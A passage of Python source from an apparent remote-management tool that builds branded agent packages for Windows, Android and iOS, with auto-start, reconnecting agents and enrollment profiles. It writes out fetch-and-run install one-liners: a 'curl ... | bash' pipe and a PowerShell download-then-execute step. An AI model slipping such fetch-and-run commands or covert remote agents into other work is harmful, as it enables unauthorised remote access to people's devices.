            f"}} catch {{ if (Test-Path $b) {{ Remove-Item $b -Force -ErrorAction SilentlyContinue }} }} "
            f"}}; "
            f"if (Test-Path $b) {{ & cmd.exe /c $b }} else {{ Write-Error 'Failed to download installer from {http_server_url}' }}"
        )

        result = {
            "success": True,
            "arch": arch,
            "installer_error": installer_error,
            "installer_ready": bool(setup_exe_path),
            "exe_path": setup_exe_path,
            "exe_filename": setup_exe_filename,
            "exe_download_url": f"/api/agents/download/{setup_exe_filename}" if setup_exe_filename else None,
            "zip_path": zip_path,
            "zip_filename": zip_filename,
            "zip_download_url": f"/api/agents/download/{zip_filename}",
            "bootstrap_path": bootstrap_path,
            "bootstrap_filename": bootstrap_filename,
            "bootstrap_download_url": f"/api/agents/bootstrap/{bootstrap_filename}",
            "vbs_path": bootstrap_vbs_path,
            "vbs_filename": vbs_filename,
            "vbs_download_url": f"/api/agents/bootstrap/{vbs_filename}" if vbs_filename else None,
            "ps1_path": bootstrap_ps1_path,
            "ps1_filename": ps1_filename,
            "ps1_download_url": f"/api/agents/bootstrap/{ps1_filename}" if ps1_filename else None,
            "one_liner": one_liner,
        }

        # Record in package history registry
        try:
            size_bytes = os.path.getsize(zip_path) if os.path.isfile(zip_path) else 0
            mtime = time.time()
            if AgentRegistry:
                AgentRegistry.record_package({
                "agent_id": agent_id,
                "endpoint_tag": endpoint_tag,
                "app_name": app_name,
                "app_title": app_title,
                "server_url": server_url,
                "arch": arch,
                "auto_start": auto_start,
                "mtime": mtime,
                "created_at": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mtime)),
                "size_bytes": size_bytes,
                "size_mb": round(size_bytes / (1024 * 1024), 1),
                "zip_filename": zip_filename,
                "zip_url": f"/api/agents/download/{zip_filename}",
                "exe_filename": setup_exe_filename,
                "exe_url": f"/api/agents/download/{setup_exe_filename}" if setup_exe_filename else None,
                "bat_filename": bootstrap_filename,
                "bat_url": f"/api/agents/bootstrap/{bootstrap_filename}",
                "vbs_filename": vbs_filename,
                "vbs_url": f"/api/agents/bootstrap/{vbs_filename}" if vbs_filename else None,
                "one_liner": one_liner,
            })
        except Exception as e:
            logger.warning(f"Failed to record package in registry: {e}")

        return result

    @staticmethod
    def _build_android_package(config: Dict[str, Any], agent_id: str, endpoint_tag: str,
                               server_url: str, http_server_url: str, auto_start: bool) -> Dict[str, Any]:
        """
        Builds a customized Android deployment package including:
        - Standalone Android App (.apk) with baked configuration
        - 1-Click Termux / Linux Shell installer (.sh)
        - Standalone Python mobile agent script (trmm_mobile_agent.py)
        - Full offline mobile bundle (.zip)
        """
        custom_name = (config.get("custom_name") or "").strip()
        if custom_name:
            clean = "".join(c for c in custom_name if c.isalnum() or c in ("-", "_", " ")).strip()
            if clean.lower().endswith(".apk"):
                clean = clean[:-4]
            app_name = clean if clean else f"Agent_{endpoint_tag}"
            app_title = clean.title() if clean else f"Agent ({endpoint_tag})"
        else:
            app_name = f"Agent_{endpoint_tag}"
            app_title = f"Agent ({endpoint_tag})"

        os.makedirs(OUTPUT_DIR, exist_ok=True)

        # 1. Build customized signed APK
        apk_filename = f"{app_name}_{endpoint_tag}_android.apk"
        apk_path = os.path.join(OUTPUT_DIR, apk_filename)
        apk_ok = False
        try:
            apk_ok = AndroidBuilder.build_custom_apk({
                "agent_id": agent_id,
                "endpoint_tag": endpoint_tag,
                "server_url": server_url,
                "auto_start": auto_start,
                "icon_base64": config.get("icon_base64"),
                "custom_name": custom_name
            }, apk_path)
            if apk_ok:
                logger.info(f"Custom Android APK generated successfully: {apk_path}")
        except Exception as e:
            logger.warning(f"Failed to build custom APK: {e}")

        apk_download_url = f"/api/agents/download/{apk_filename}" if (apk_ok and os.path.isfile(apk_path)) else None

        # 2. Build 1-Click shell bootstrap (.sh)
        zip_filename = f"{app_name}_{endpoint_tag}_android.zip"
        zip_path = os.path.join(OUTPUT_DIR, zip_filename)
        zip_download_url = f"{http_server_url}/api/agents/download/{zip_filename}"

        sh_filename = f"install_{app_name}.sh"
        sh_path = os.path.join(OUTPUT_DIR, sh_filename)
        sh_content = AndroidBuilder.generate_shell_bootstrap(
            app_name, endpoint_tag, agent_id, zip_download_url, server_url
        )
        with open(sh_path, "w", encoding="utf-8", newline="\n") as sf:
            sf.write(sh_content)
        sh_download_url = f"/api/agents/bootstrap/{sh_filename}"

        # 3. Create standalone Python agent
        py_agent_content = AndroidBuilder.generate_mobile_python_agent({
            "agent_id": agent_id,
            "endpoint_tag": endpoint_tag,
            "server_url": server_url,
            "auto_start": auto_start
        })

        # 4. Create offline zip package
        build_dir = os.path.join(OUTPUT_DIR, f"build_{agent_id}")
        if os.path.exists(build_dir):
            shutil.rmtree(build_dir, ignore_errors=True)
        os.makedirs(build_dir, exist_ok=True)

        with open(os.path.join(build_dir, "trmm_mobile_agent.py"), "w", encoding="utf-8", newline="\n") as pf:
            pf.write(py_agent_content)

        with open(os.path.join(build_dir, "install.sh"), "w", encoding="utf-8", newline="\n") as sf:
            sf.write(sh_content)

        agent_config = {
            "agent_id": agent_id,
            "endpoint_tag": endpoint_tag,
            "server_url": server_url,
            "arch": "android",
            "os": "Android device",
            "platform": "android",
            "is_android": True,
            "auto_start": auto_start,
            "reconnect_interval_sec": 5,
            "heartbeat_interval_sec": 10,
        }
        with open(os.path.join(build_dir, "config.json"), "w", encoding="utf-8") as jf:
            json.dump(agent_config, jf, indent=4)

        if apk_ok and os.path.isfile(apk_path):
            shutil.copy2(apk_path, os.path.join(build_dir, f"{app_name}.apk"))

        partial_zip_path = f"{zip_path}.{agent_id}.partial"
        try:
            with zipfile.ZipFile(partial_zip_path, "w", zipfile.ZIP_DEFLATED) as zipf:
                for root, _, files in os.walk(build_dir):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, build_dir)
                        zipf.write(file_path, arcname)
            os.replace(partial_zip_path, zip_path)
            logger.info(f"Generated Android offline bundle: {zip_path}")
        except Exception:
            if os.path.isfile(partial_zip_path):
                os.remove(partial_zip_path)
            raise
        finally:
            if os.path.isdir(build_dir):
                shutil.rmtree(build_dir, ignore_errors=True)

        # 5. One-liner curl command
        one_liner = f"curl -fsSL '{http_server_url}/api/agents/bootstrap/{sh_filename}' | bash"

        # 6. Record in package history registry
        try:
            from .registry import AgentRegistry
        except (ImportError, ModuleNotFoundError):
            try:
                from master_hub.registry import AgentRegistry
            except Exception:
                AgentRegistry = None

        size_bytes = os.path.getsize(zip_path) if os.path.isfile(zip_path) else 0
        mtime = time.time()
        if AgentRegistry:
            try:
                AgentRegistry.record_package({
                    "agent_id": agent_id,
                    "endpoint_tag": endpoint_tag,
                    "app_name": app_name,
                    "app_title": app_title,
                    "server_url": server_url,
                    "arch": "android",
                    "auto_start": auto_start,
                    "mtime": mtime,
                    "created_at": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mtime)),
                    "size_bytes": size_bytes,
                    "size_mb": round(size_bytes / (1024 * 1024), 1),
                    "zip_filename": zip_filename,
                    "zip_url": f"/api/agents/download/{zip_filename}",
                    "apk_filename": apk_filename if apk_ok else None,
                    "apk_url": apk_download_url,
                    "sh_filename": sh_filename,
                    "sh_url": sh_download_url,
                    "exe_filename": None,
                    "exe_url": None,
                    "bat_filename": None,
                    "bat_url": None,
                    "vbs_filename": None,
                    "vbs_url": None,
                    "one_liner": one_liner,
                })
            except Exception as e:
                logger.warning(f"Failed to record Android package in registry: {e}")

        return {
            "success": True,
            "arch": "android",
            "installer_ready": bool(apk_ok or os.path.isfile(sh_path)),
            "installer_error": None if apk_ok else "APK base not present. Shell/Python agent ready.",
            "apk_path": apk_path if apk_ok else None,
            "apk_filename": apk_filename if apk_ok else None,
            "apk_download_url": apk_download_url,
            "sh_path": sh_path,
            "sh_filename": sh_filename,
            "sh_download_url": sh_download_url,
            "exe_path": None,
            "exe_filename": None,
            "exe_download_url": None,
            "zip_path": zip_path,
            "zip_filename": zip_filename,
            "zip_download_url": f"/api/agents/download/{zip_filename}",
            "bootstrap_path": sh_path,
            "bootstrap_filename": sh_filename,
            "bootstrap_download_url": sh_download_url,
            "vbs_path": None,
            "vbs_filename": None,
            "vbs_download_url": None,
            "one_liner": one_liner,
        }

    @staticmethod
    def _build_ios_package(config: Dict[str, Any], agent_id: str, endpoint_tag: str,
                           server_url: str, http_server_url: str) -> Dict[str, Any]:
        """Builds an Apple iOS deployment package (mobileconfig profile, enrollment URL, and QR code)."""
        res = IosBuilder.build_ios_package(config, agent_id, endpoint_tag, server_url, http_server_url)

        profile_filename = res.get("profile_filename")
        profile_path = res.get("profile_path")
        profile_download_url = res.get("profile_download_url")
        kiosk_filename = res.get("kiosk_filename")
        kiosk_path = res.get("kiosk_path")
        kiosk_download_url = res.get("kiosk_download_url")
        enroll_url = res.get("enroll_url")
        qr_data_url = res.get("qr_data_url")
        app_name = res.get("app_name")

        one_liner = enroll_url

        try:
            from .registry import AgentRegistry
        except (ImportError, ModuleNotFoundError):
            try:
                from master_hub.registry import AgentRegistry
            except Exception:
                AgentRegistry = None

        try:
            mtime = os.path.getmtime(profile_path) if profile_path and os.path.isfile(profile_path) else time.time()
            size_bytes = os.path.getsize(profile_path) if profile_path and os.path.isfile(profile_path) else 0
            if AgentRegistry:
                AgentRegistry.record_package({
                    "agent_id": agent_id,
                    "endpoint_tag": endpoint_tag,
                    "app_name": app_name,
                    "app_title": app_name,
                    "server_url": server_url,
                    "arch": "ios",
                    "auto_start": True,
                    "mtime": mtime,
                    "created_at": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime(mtime)),
                    "size_bytes": size_bytes,
                    "size_mb": round(size_bytes / (1024 * 1024), 2),
                    "profile_filename": profile_filename,
                    "profile_url": profile_download_url,
                    "kiosk_filename": kiosk_filename,
                    "kiosk_url": kiosk_download_url,
                    "enroll_url": enroll_url,
                    "qr_data_url": qr_data_url,
                    "one_liner": one_liner,
                })
        except Exception as e:
            logger.warning(f"Failed to record iOS package in registry: {e}")

        return {
            "success": True,
            "arch": "ios",
            "installer_ready": True,
            "installer_error": None,
            "profile_path": profile_path,
            "profile_filename": profile_filename,
            "profile_download_url": profile_download_url,
            "kiosk_path": kiosk_path,
            "kiosk_filename": kiosk_filename,
            "kiosk_download_url": kiosk_download_url,
            "enroll_url": enroll_url,
            "qr_data_url": qr_data_url,
            "one_liner": one_liner,
            "apk_path": None,
            "apk_filename": None,
            "apk_download_url": None,
            "sh_path": None,
            "sh_filename": None,
            "sh_download_url": None,
            "exe_path": None,
            "exe_filename": None,
            "exe_download_url": None,
            "script_path": None,
            "script_filename": None,
            "script_download_url": None,
            "vbs_path": None,
            "vbs_filename": None,
            "vbs_download_url": None,
            "zip_path": None,
            "zip_filename": None,
            "zip_download_url": None,
            "agent_id": agent_id,
            "endpoint_tag": endpoint_tag,
            "app_name": app_name
        }
